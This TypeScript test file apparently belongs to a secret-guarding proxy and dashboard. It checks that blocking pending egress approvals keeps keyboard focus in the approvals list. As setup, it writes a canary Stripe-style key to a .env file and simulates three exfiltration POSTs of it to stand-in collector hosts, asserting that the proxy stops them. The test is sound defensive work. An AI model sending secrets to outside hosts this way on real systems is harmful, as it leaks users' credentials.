/**
 * product-answer-focus.test — an answer on the product page keeps the
 * keyboard focus in its list, across the REAL components (dashboard.md §4.25
 * *An answer keeps the focus in its list*). Mandu-new.
 *
 * An answer turns its card's buttons off while it is on its way, and a
 * browser drops the focus of a button turned off to <body>. Until 2026-10-11
 * it stayed there: after Enter on Block the next question was never read
 * out, nor "Nothing is waiting for you.", and a refused answer's button had
 * lost the focus. Here a real ArbiterServer runs at the `secrets` axes, the
 * net-proxy runs in its production wiring, and a real DashboardServer over
 * the production approvals adapter serves the product page (its own
 * index.html and home.js in jsdom). Each button is focused before its click,
 * as Enter does, and its focus dropped to <body> as a browser does:
 *
 *   A1  the net-proxy stops three sends of a registered key to three hosts
 *       no rule binds it to: three real questions wait;
 *   A2  signed out, Block on a card is refused: the button, on again, has
 *       the focus back, described by "Sign in first: …"; the question still
 *       waits;
 *   A3  signed in, Block on the first card answers it: the line it leaves
 *       where the card was has the focus (dashboard.md §4.25 *An answer
 *       says what it did*, since 2026-10-22; before, the card that took its
 *       place); Block on the last card: its line, after the one before it;
 *       Block on the one left: its line, over "Nothing is waiting for
 *       you."; never an answer button; the arbiter has the three answers;
 *   A4  nothing rejects unhandled; the oracle: neither `/api/home` nor any
 *       rendered page carries the key's value, and none carries a token;
 *       nothing was forwarded.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer, type ApprovalsArbiter } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";

stateAxes("secrets");

const KEY_VALUE = "sk_" + "live_productAnswerFocusStackCanary001";
const SESSION = "1791300000-0432";
const CSRF = { "X-Mandu-Control": "1" };
const HOSTS = ["collector1.example", "collector2.example", "collector3.example"];

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

/** Enter on a button: it has the focus, the click answers, and the browser
 *  drops the focus of the button the answer turned off to <body>. jsdom
 *  neither drops it nor blurs a button that is off, so the button is on
 *  for the blur only. */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function press(btn: any): void {
  assert.ok(btn, "the button is there");
  btn.focus();
  btn.click();
  assert.equal(btn.disabled, true, "the answer turns its button off while it is on its way");
  btn.disabled = false;
  btn.blur();
  btn.disabled = true;
}
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const cards = (doc: any) => [...doc.querySelectorAll("#approvals-waiting > .ask")] as any[];
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const block = (card: any) => [...card.querySelectorAll("button")].find((b: any) => b.textContent === "Block") as any;

test("an answer keeps the keyboard focus in its list: the line it leaves where the card was, or the refused button (real arbiter, net-proxy, dashboard, served page)", { timeout: 180_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-answer-focus-"));
  const home = join(tmp, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanPath,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, // the `secrets` axes, stated
  });
  await arbiter.listen();

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);

  const gate = new ArbiterClient(socketPath); await gate.connect();
  const admin = new ArbiterClient(join(tmp, "admin.sock")); await admin.connect();
  const approvalsArbiter: ApprovalsArbiter = {
    egressApprovals: (status) => admin.egressApprovals(status),
    resolveEgressApproval: (approvalId, approve, scope) => admin.resolveEgressApproval(approvalId, approve, scope),
  };
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter,
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mandu-home") },
    log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  const signedIn = { Cookie: dashboard.adminCookie() };
  const rendered: [string, string][] = [];
  const unhandled: string[] = [];
  const onUnhandled = (e: unknown) => unhandled.push(String((e as Error)?.message ?? e));
  process.on("unhandledRejection", onUnhandled);
  try {
    // ── A1: three sends of a registered key are stopped ─────────────────────
    const env = join(home, "proj", ".env");
    writeFileSync(env, `STRIPE_KEY=${KEY_VALUE}\n`);
    const reg = await gate.registerSecret({ path: env, sessionKey: SESSION });
    const keySym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(keySym, `the key has its own symbol: ${JSON.stringify(reg)}`);
    for (const host of HOSTS) {
      const res = await viaProxy(proxyPort, `http://${host}/upload`, `k=${keySym}`);
      assert.equal(res.status, 403, `the send to ${host} is stopped: ${res.body}`);
      assert.ok(!res.body.includes(KEY_VALUE), "the agent's answer carries no value");
    }
    assert.deepEqual(forwarded, []);
    const pending = await admin.egressApprovals("pending");
    assert.equal(pending.filter((a) => a.symbol === keySym).length, 3, "three questions wait");

    // ── A2: signed out, a refused Block gives its button the focus back ─────
    await servedProductPage(base, "/approvals", (doc) => cards(doc).length === 3, async (doc) => {
      const card = cards(doc)[1];
      press(block(card));
      await waitWhile(() => !card.querySelector(".ask-error"));
      const again = block(card);
      assert.equal(again.disabled, false, "on again");
      assert.equal(doc.activeElement, again, "the button pressed has the focus back");
      const words = doc.getElementById(again.getAttribute("aria-describedby"));
      assert.ok(words && card.contains(words), "it is described by the refusal's words");
      assert.match(words.textContent, /^Sign in first: /);
      rendered.push(["the Approvals page signed out", doc.documentElement.outerHTML]);
    });
    assert.equal((await admin.egressApprovals("pending")).length, 3, "refused: nothing was answered");

    // ── A3: signed in, each Block gives the focus on ────────────────────────
    await servedProductPage(base, "/approvals", (doc) => cards(doc).length === 3, async (doc) => {
      const [first, second, third] = cards(doc).map((c) => c.dataset.id as string);
      // The list is drawn with the focus given on (one task): once a card
      // has gone, the focus is where it goes.
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const cardOf = (id: string) => cards(doc).find((c: any) => c.dataset.id === id);
      const line = () => doc.querySelector("#approvals-waiting > .answer-line");
      press(block(cardOf(first!)));
      await waitWhile(() => cardOf(first!) !== undefined);
      assert.equal(doc.activeElement, line(), "the line where the card was has the focus");
      assert.equal(doc.activeElement.tagName, "DIV", "a line, never an answer button");
      assert.match(doc.activeElement.textContent, /^Blocked: send your secret STRIPE_KEY to collector\d\.example\. Nothing was sent\. Change your answer$/);
      assert.equal(doc.activeElement.nextElementSibling, cardOf(second!), "the next question right after it");
      press(block(cardOf(third!)));
      await waitWhile(() => cardOf(third!) !== undefined);
      assert.equal(doc.activeElement, line(), "the last answered: its line");
      assert.equal(doc.activeElement.previousElementSibling, cardOf(second!), "after the one before it");
      press(block(cardOf(second!)));
      await waitWhile(() => cards(doc).length > 0);
      assert.equal(doc.activeElement, line());
      assert.equal(doc.querySelectorAll("#approvals-waiting > .answer-line").length, 1, "one line: each answer replaces the last");
      assert.equal(doc.activeElement.nextElementSibling.textContent, "Nothing is waiting for you.");
      assert.equal(doc.activeElement.parentElement.id, "approvals-waiting");
      rendered.push(["the Approvals page signed in", doc.documentElement.outerHTML]);
    }, { headers: signedIn });
    assert.equal((await admin.egressApprovals("pending")).length, 0, "the three answers reached the arbiter");

    // ── A4: nothing rejected unhandled; the oracle ───────────────────────────
    assert.deepEqual(unhandled, [], "no unhandled rejection in the page");
    assert.deepEqual(forwarded, [], "nothing was forwarded");
    const bodies: [string, string][] = [
      ["/api/home", await (await pageFetch(`${base}/api/home`)).text()],
      ["/api/home signed in", await (await pageFetch(`${base}/api/home`, { headers: { ...CSRF, ...signedIn } })).text()],
      ...rendered,
    ];
    for (const [where, body] of bodies) {
      assert.ok(!body.includes(KEY_VALUE), `CONFIDENTIALITY VIOLATION: the key's value is in ${where}`);
      assert.doesNotMatch(body, /\$MDU/, `${where} carries no token`);
    }
  } finally {
    process.off("unhandledRejection", onUnhandled);
    await dashboard.close();
    await proxy.close();
    netClient.close(); netHuman.close();
    gate.close(); admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
